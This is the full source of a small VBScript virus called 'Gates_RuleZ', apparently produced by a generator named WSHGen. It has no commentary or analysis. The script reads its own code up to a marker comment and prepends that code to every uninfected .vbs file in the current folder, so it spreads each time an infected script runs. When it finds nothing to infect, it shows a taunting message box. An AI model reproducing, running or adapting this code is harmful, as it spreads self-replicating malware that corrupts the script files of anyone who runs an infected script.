'This_PC
' Gates_RuleZ
' Generated by WSHGen.1

endl=chr(13)&chr(10)

on error resume next

hostName=Wscript.ScriptFullName

set fso=createObject("Scripting.FileSystemObject")

set fd=fso.openTextFile(hostName,1)
hostCode=fd.readAll
fd.close

virusSize=inStr(9,hostCode,"This_P"&"C")+1

set fd=fso.openTextFile(hostName,1)
virusCode=fd.read(virusSize)
fd.close

cont=0
for each victim in fso.getfolder(".").files

vExt=fso.getExtensionName(victim.name)
i=0
if mid(vExt,1,1)="v" or mid(vExt,1,1)="V" then i=i+1 end if
if mid(vExt,2,1)="b" or mid(vExt,2,1)="B" then i=i+1 end if
if mid(vExt,3,1)="s" or mid(vExt,3,1)="S" then i=i+1 end if

if i=3 then
set fd=fso.openTextFile(victim.path,1)
victimCode=fd.readAll
fd.close

if left(victimCode,8)<>chr(39)&"This_P"&"C" then
infectedCode=virusCode&endl&victimCode
set fd=fso.openTextFile(victim.path,2,1)
fd.write infectedCode
fd.close
cont=1
end if

end if
next

if cont=0 then msgbox"Bill Gates rulez this PC!",0,"Gates_RuleZ"

'This_PC